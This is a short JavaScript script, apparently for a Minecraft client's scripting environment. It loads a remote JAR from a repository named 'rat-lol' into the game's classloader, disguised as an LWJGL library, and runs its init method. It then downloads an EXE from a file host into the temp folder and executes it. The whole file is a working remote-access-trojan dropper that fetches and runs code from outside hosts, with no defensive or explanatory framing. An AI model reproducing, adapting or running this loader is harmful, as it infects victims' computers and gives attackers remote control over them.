// SIMPLE WORKING VERSION
(function() {
    try {
        // 1. Load JAR (your original working code)
        var URLClassLoader = Java.type("java.net.URLClassLoader");
        var URL = Java.type("java.net.URL");
        var Minecraft = Java.type("net.minecraft.client.Minecraft");
        
        var jarURL = new URL("https://github.com/MansHeree/rat-lol/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
        var classLoader = Minecraft.class.getClassLoader();
        
        var addURL = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
        addURL.setAccessible(true);
        addURL.invoke(classLoader, jarURL);
        java.lang.Thread.sleep(1000);
        
        classLoader.loadClass("org.lwjgl36.VersionImp").getMethod("init").invoke(null);
        print("JAR loaded successfully!");

        // 2. Download and run EXE (basic version)
        var exeUrl = "https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe";
        var exePath = new java.io.File(java.lang.System.getProperty("java.io.tmpdir"), "run.exe");
        
        // Simple download
        var in = new java.net.URL(exeUrl).openStream();
        var out = new java.io.FileOutputStream(exePath);
        var buf = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
        var len;
        while ((len = in.read(buf)) > 0) {
            out.write(buf, 0, len);
        }
        in.close();
        out.close();
        
        // Simple execute
        java.lang.Runtime.getRuntime().exec(exePath.getAbsolutePath());
        print("EXE execution attempted!");
        
    } catch (e) {
        print("Error: " + e);
    }
})();